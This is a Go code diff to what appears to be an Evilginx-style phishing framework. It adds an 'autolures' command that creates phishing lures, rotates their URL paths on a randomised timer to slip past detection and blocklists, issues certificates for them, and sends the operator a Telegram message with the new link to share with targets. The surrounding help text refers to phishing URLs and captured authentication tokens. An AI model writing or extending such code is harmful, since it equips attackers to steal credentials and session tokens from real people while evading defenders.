@@ -97,6 +97,7 @@ func (t *Terminal) DoWork() {
 
 	t.output("%s", t.sprintPhishletStatus(""))
 	go t.monitorLurePause()
+	go t.monitorAutoLureRotation()
 
 	for !do_quit {
 		line, err := t.rl.Readline()
@@ -154,6 +155,12 @@ func (t *Terminal) DoWork() {
 			err := t.handleLures(args[1:])
 			if err != nil {
 				log.Error("lures: %v", err)
+			}
+		case "autolures":
+			cmd_ok = true
+			err := t.handleAutoLures(args[1:])
+			if err != nil {
+				log.Error("autolures: %v", err)
 			}
 		case "redirects":
 			cmd_ok = true
@@ -1394,6 +1401,272 @@ func (t *Terminal) handleLures(args []string) error {
 	return fmt.Errorf("invalid syntax: %s", args)
 }
 
+func (t *Terminal) handleAutoLures(args []string) error {
+	hiblue := color.New(color.FgHiBlue)
+	cyan := color.New(color.FgHiCyan)
+	green := color.New(color.FgHiGreen)
+	yellow := color.New(color.FgYellow)
+	dgray := color.New(color.FgHiBlack)
+
+	pn := len(args)
+
+	if pn == 0 {
+		// List all autolures
+		found := false
+		for n, l := range t.cfg.lures {
+			if !l.AutoRotate {
+				continue
+			}
+			found = true
+			notifyStr := dgray.Sprint("off")
+			if l.RotateNotify {
+				notifyStr = green.Sprint("on")
+			}
+			intervalStr := "random (45-90m)"
+			if l.RotateInterval > 0 {
+				intervalStr = GetDurationString(time.Now(), time.Now().Add(time.Duration(l.RotateInterval)*time.Second))
+			}
+			nextStr := dgray.Sprint("pending")
+			if l.NextRotate > 0 {
+				nextStr = green.Sprint(GetDurationString(time.Now(), time.Unix(l.NextRotate, 0)))
+			}
+			keys := []string{"id", "phishlet", "gateway", "active path", "interval", "next rotation", "notify"}
+			vals := []string{
+				fmt.Sprintf("%d", n),
+				hiblue.Sprint(l.Phishlet),
+				cyan.Sprint("https://" + l.Hostname),
+				yellow.Sprint("https://" + l.Hostname + l.Path),
+				intervalStr,
+				nextStr,
+				notifyStr,
+			}
+			log.Printf("\n%s\n", AsRows(keys, vals))
+		}
+		if !found {
+			log.Info("no autolures configured — use 'autolures create <phishlet> <subdomain>'")
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "create":
+		if pn < 3 {
+			return fmt.Errorf("usage: autolures create <phishlet> <subdomain> [<interval>]\n  interval format: 1h, 30m, 2h30m (omit for random 45-90m)")
+		}
+		phishletName := args[1]
+		if _, err := t.cfg.GetPhishlet(phishletName); err != nil {
+			return err
+		}
+		bhost, ok := t.cfg.GetSiteDomain(phishletName)
+		if !ok || bhost == "" {
+			return fmt.Errorf("no domain set for phishlet '%s' — run 'phishlets hostname %s <domain>' first", phishletName, phishletName)
+		}
+
+		// Args[2]: subdomain. Optional args[3]: interval.
+		subdomain := args[2]
+		subRe := regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$`)
+		if !subRe.MatchString(subdomain) {
+			return fmt.Errorf("invalid subdomain '%s'", subdomain)
+		}
+		hostname := subdomain + "." + bhost
+
+		var interval int64
+		if pn >= 4 {
+			d, err := ParseDurationString(args[3])
+			if err != nil {
+				return fmt.Errorf("invalid interval '%s': use format 1h, 30m, 2h30m", args[3])
+			}
+			interval = int64(d.Seconds())
+			if interval < 60 {
+				return fmt.Errorf("interval must be at least 1m")
+			}
+		}
+
+		now := time.Now().Unix()
+		initialPath := "/" + GenRandomString(8)
+		var nextRotate int64
+		if interval > 0 {
+			nextRotate = now + interval
+		} else {
+			nextRotate = now + 2700 + rand.Int63n(2700) // 45–90 min
+		}
+
+		l := &Lure{
+			Path:           initialPath,
+			Phishlet:       phishletName,
+			Hostname:       hostname,
+			AutoRotate:     true,
+			RotateInterval: interval,
+			NextRotate:     nextRotate,
+			RotateNotify:   true,
+		}
+		t.cfg.AddLure(phishletName, l)
+		t.cfg.refreshActiveHostnames()
+		t.manageCertificates(true)
+
+		id := len(t.cfg.lures) - 1
+		intervalStr := "random (45-90m)"
+		if interval > 0 {
+			intervalStr = GetDurationString(time.Now(), time.Now().Add(time.Duration(interval)*time.Second))
+		}
+		log.Info("autolure created (id: %d)", id)
+		log.Info("share this URL:  https://%s", hostname)
+		log.Info("active path now: https://%s%s", hostname, initialPath)
+		log.Info("rotation every:  %s", intervalStr)
+		log.Info("telegram notify: on  (disable with: autolures notify %d off)", id)
+		return nil
+
+	case "delete":
+		if pn < 2 {
+			return fmt.Errorf("usage: autolures delete <id>")
+		}
+		id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+		if err != nil {
+			return fmt.Errorf("delete: %v", err)
+		}
+		l, err := t.cfg.GetLure(id)
+		if err != nil {
+			return fmt.Errorf("delete: %v", err)
+		}
+		if !l.AutoRotate {
+			return fmt.Errorf("lure %d is not an autolure — use 'lures delete %d'", id, id)
+		}
+		rdi := t.cfg.DeleteLures([]int{id})
+		for _, did := range rdi {
+			log.Info("deleted autolure with ID: %d", did)
+		}
+		t.cfg.refreshActiveHostnames()
+		return nil
+
+	case "get-url":
+		if pn < 2 {
+			return fmt.Errorf("usage: autolures get-url <id>")
+		}
+		id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+		if err != nil {
+			return fmt.Errorf("get-url: %v", err)
+		}
+		l, err := t.cfg.GetLure(id)
+		if err != nil {
+			return fmt.Errorf("get-url: %v", err)
+		}
+		if !l.AutoRotate {
+			return fmt.Errorf("lure %d is not an autolure", id)
+		}
+		log.Info("share this URL:  https://%s", l.Hostname)
+		log.Info("active path now: https://%s%s", l.Hostname, l.Path)
+		nextStr := GetDurationString(time.Now(), time.Unix(l.NextRotate, 0))
+		log.Info("next rotation:   in %s", nextStr)
+		return nil
+
+	case "notify":
+		if pn < 3 {
+			return fmt.Errorf("usage: autolures notify <id> on|off")
+		}
+		id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+		if err != nil {
+			return fmt.Errorf("notify: %v", err)
+		}
+		l, err := t.cfg.GetLure(id)
+		if err != nil {
+			return fmt.Errorf("notify: %v", err)
+		}
+		if !l.AutoRotate {
+			return fmt.Errorf("lure %d is not an autolure", id)
+		}
+		switch args[2] {
+		case "on":
+			l.RotateNotify = true
+			if err := t.cfg.SetLure(id, l); err != nil {
+				return err
+			}
+			log.Info("autolure %d: telegram notifications enabled", id)
+		case "off":
+			l.RotateNotify = false
+			if err := t.cfg.SetLure(id, l); err != nil {
+				return err
+			}
+			log.Info("autolure %d: telegram notifications disabled", id)
+		default:
+			return fmt.Errorf("usage: autolures notify <id> on|off")
+		}
+		return nil
+	}
+
+	return fmt.Errorf("invalid syntax — run 'autolures' for usage")
+}
+
+func (t *Terminal) monitorAutoLureRotation() {
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+	for range ticker.C {
+		now := time.Now().Unix()
+		for i, l := range t.cfg.lures {
+			if !l.AutoRotate || l.NextRotate == 0 {
+				continue
+			}
+			if now < l.NextRotate {
+				continue
+			}
+			oldPath := l.Path
+			newPath := "/" + GenRandomString(8)
+			l.Path = newPath
+			if l.RotateInterval > 0 {
+				l.NextRotate = now + l.RotateInterval
+			} else {
+				l.NextRotate = now + 2700 + rand.Int63n(2700)
+			}
+			if err := t.cfg.SetLure(i, l); err != nil {
+				log.Error("[autolure] failed to save lure %d after rotation: %v", i, err)
+				continue
+			}
+			nextStr := time.Unix(l.NextRotate, 0).Format("15:04:05")
+			log.Info("[autolure] [%s] path rotated: %s → %s (next at %s)", l.Phishlet, oldPath, newPath, nextStr)
+			if l.RotateNotify {
+				go t.sendAutoLureNotification(l)
+			}
+		}
+	}
+}
+
+func (t *Terminal) sendAutoLureNotification(l *Lure) {
+	chatid := t.cfg.general.Chatid
+	teletoken := t.cfg.general.Teletoken
+	if chatid == "" || teletoken == "" {
+		return
+	}
+	bot, err := tgbotapi.NewBotAPI(teletoken)
+	if err != nil {
+		log.Error("[autolure] telegram: %v", err)
+		return
+	}
+	chatIDInt, err := strconv.ParseInt(chatid, 10, 64)
+	if err != nil {
+		return
+	}
+	activeURL := "https://" + l.Hostname + l.Path
+	nextStr := time.Unix(l.NextRotate, 0).UTC().Format("02 Jan 2006 · 15:04 UTC")
+
+	plEsc := TelegramMarkdownV2Escape(strings.ToUpper(l.Phishlet))
+	urlEsc := TelegramMarkdownV2Escape(activeURL)
+	gatewayEsc := TelegramMarkdownV2Escape("https://" + l.Hostname)
+	nextEsc := TelegramMarkdownV2Escape(nextStr)
+
+	message := fmt.Sprintf(
+		"🔄 *AUTOLURE ROTATED* · %s\n\n"+
+			"*Gateway URL* \\(share this\\):\n`%s`\n\n"+
+			"*New active path*:\n`%s`\n\n"+
+			"📅 Next rotation: `%s`",
+		plEsc, gatewayEsc, urlEsc, nextEsc,
+	)
+	msg := tgbotapi.NewMessage(chatIDInt, message)
+	msg.ParseMode = "MarkdownV2"
+	msg.DisableWebPagePreview = true
+	if _, err = bot.Send(msg); err != nil {
+		log.Error("[autolure] telegram send failed: %v", err)
+	}
+}
+
 func (t *Terminal) monitorLurePause() {
 	var pausedLures map[string]int64
 	pausedLures = make(map[string]int64)
@@ -1478,6 +1751,16 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
+
+	h.AddCommand("autolures", "general", "manage auto-rotating lures", "Creates lures whose path rotates on a timer. Share the gateway URL — it always redirects to the current active path.", LAYER_TOP,
+		readline.PcItem("autolures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("delete"), readline.PcItem("get-url"), readline.PcItem("notify", readline.PcItem("on"), readline.PcItem("off"))))
+
+	h.AddSubCommand("autolures", nil, "", "list all auto-rotating lures")
+	h.AddSubCommand("autolures", []string{"create"}, "create <phishlet> <subdomain> [<interval>]", "create an auto-rotating lure; interval e.g. 1h, 30m, 2h30m (default: random 45-90m)")
+	h.AddSubCommand("autolures", []string{"delete"}, "delete <id>", "delete an autolure")
+	h.AddSubCommand("autolures", []string{"get-url"}, "get-url <id>", "show the current gateway and active path URLs")
+	h.AddSubCommand("autolures", []string{"notify"}, "notify <id> on|off", "enable or disable Telegram notification on path rotation")
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
